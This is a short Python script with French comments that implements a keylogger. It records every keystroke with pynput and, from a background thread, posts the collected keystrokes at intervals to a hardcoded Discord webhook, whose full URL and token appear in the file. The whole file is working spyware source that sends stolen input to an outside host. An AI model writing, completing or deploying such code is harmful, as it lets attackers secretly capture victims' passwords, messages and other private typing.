import os
import sys
import threading
import requests
import time
from pynput import keyboard

# Webhook Discord ou serveur perso
WEBHOOK_URL = "https://discord.com/api/webhooks/1353353580467458138/fvEgoFmiNhnQh1WCcJU-bDVwxXoFy5KOH4zapOXQuuMA8BrPOE4sUV3yyvplODME0jxn"

# Stockage des frappes clavier en mémoire
key_logs = []

# Fonction pour capturer les touches
def on_press(key):
    global key_logs
    try:
        key_logs.append(key.char)
    except AttributeError:
        key_logs.append(f"[{key}]")

# Fonction pour envoyer les logs toutes les 30 secondes
def send_logs():
    global key_logs
    while True:
        if key_logs:  # Vérifie s'il y a du texte à envoyer
            payload = {"content": f"```\n{''.join(key_logs)}\n```"}
            requests.post(WEBHOOK_URL, json=payload)
            key_logs = []  # Vide la mémoire après l'envoi
        time.sleep(15)  # Pause de 30 secondes

# Lancer le keylogger et l'envoi des données en parallèle
def start_logger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Thread pour envoyer les logs en arrière-plan
    log_thread = threading.Thread(target=send_logs, daemon=True)
    log_thread.start()

    listener.join()

if __name__ == "__main__":
    start_logger()
